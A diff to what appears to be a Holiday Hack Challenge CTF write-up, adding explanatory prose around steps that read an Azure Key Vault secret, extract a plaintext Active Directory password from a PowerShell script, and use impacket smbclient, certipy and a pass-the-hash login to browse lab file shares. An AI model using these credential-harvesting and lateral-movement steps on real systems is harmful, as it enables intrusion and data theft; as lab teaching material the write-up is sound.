@@ -1737,6 +1737,7 @@ Now that we know the name of the secret, we can query its value directly by appe
 ```sh
 curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?maxresults=1&api-version=7.4" | jq
 ```
+This returns a JSON object with the value along with a bunch of unnecessary attributes.
 
 ```json
 {
@@ -1753,9 +1754,8 @@ curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddU
 }
 ```
 
-This returns a JSON object with a lot of unnecessary attributes, so to fetch the
-value of the script in its raw form we can repeat the request with jq with the
-`-r` flag and the `value` argument.
+To fetch the value of the script in its raw form we can repeat the request piping it to `jq`. We can query the value using `jq` by using the
+`--raw-output` flag or its shorthand `-r` followed by the `value` argument.
 
 
 ```sh
@@ -1768,13 +1768,18 @@ Inside the retrieved PowerShell script, we find that the password to the Active 
 Import-Module ActiveDirectory; $UserName = "elfy"; $UserDomain = "northpole.local"; $UserUPN = "$UserName@$UserDomain"; $Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force; $DCIP = "10.0.0.53"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
 ```
 
+I will set this password as an environment variable for easy access in later commands.
+
 ```sh
 PW='J4`ufC49/J4766'
 ```
+Now we can use smbclient with that environment variable for logging in as Elfie into `northpole.local`.
 
 ```
 smbclient.py "northpole.local/elfy:$PW@10.0.0.53"
 ```
+
+We will use the `shares` command to list the available shares.
 
 ```
 # shares
@@ -1785,6 +1790,11 @@ FileShare
 IPC$
 NETLOGON
 SYSVOL
+```
+
+The share that stands out to us is FileShare. Let's `use` it and list its contents.
+
+```
 # use FileShare
 # ls
 drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 .
@@ -1794,11 +1804,18 @@ drw-rw-rw-          0  Sun Dec 17 01:15:09 2023 ..
 -rw-rw-rw-      54096  Sun Dec 17 01:15:12 2023 SignatureCookies.pdf
 drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 super_secret_research
 -rw-rw-rw-        165  Sun Dec 17 01:15:12 2023 todo.txt
+```
+
+We can try reading the `todo.txt` file since it might contain hints as to our next objective.
+
+```
 # cat todo.txt
 1. Bake some cookies.
 2. Restrict access to C:\FileShare\super_secret_research to only researchers so everyone cant see the folder or read its contents
 3. Profit
 ```
+
+The `super_secret_research` directory is restricted only to researchers, we can even test this by trying to list the directory which yields an error.
 
 ```sh
 certipy find \
@@ -1997,23 +2014,7 @@ alabaster@ssh-server-vm:~$ smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 Type help for list of commands
-# shares
-ADMIN$
-C$
-D$
-FileShare
-IPC$
-NETLOGON
-SYSVOL
 # use FileShare
-# ls
-drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 .
-drw-rw-rw-          0  Sun Dec 17 01:15:09 2023 ..
--rw-rw-rw-     701028  Sun Dec 17 01:15:12 2023 Cookies.pdf
--rw-rw-rw-    1521650  Sun Dec 17 01:15:12 2023 Cookies_Recipe.pdf
--rw-rw-rw-      54096  Sun Dec 17 01:15:12 2023 SignatureCookies.pdf
-drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 super_secret_research
--rw-rw-rw-        165  Sun Dec 17 01:15:12 2023 todo.txt
 # cd super_secret_research
 # ls
 drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 .
